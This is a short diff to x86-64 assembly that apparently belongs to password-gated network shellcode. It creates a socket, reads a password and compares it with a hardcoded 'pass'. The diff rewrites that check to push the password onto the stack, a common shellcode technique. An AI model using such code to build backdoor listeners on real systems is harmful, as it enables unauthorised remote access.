@@ -2,11 +2,6 @@ global _start
 
 %define _START
 _start:
-    jmp real_start
-    password: db "pass"
-    pass_len: db $-password
-
-real_start:
 socket:
     ; sock = socket(AF_INET, SOCK_STREAM, 0)
     ; AF_INET = 2
@@ -122,9 +117,11 @@ read_password:
     syscall
 
 compare_password:
-    xor ecx, ecx
-    mov cl, [rel pass_len]
-    lea rdi, [rel password]
+    push dword 0x73736170  ; password
+    push 4                 ; password length
+    pop rcx
+    push rsp
+    pop rdi        ; rdi = *password
     cld
     repz cmpsb
     jne exit
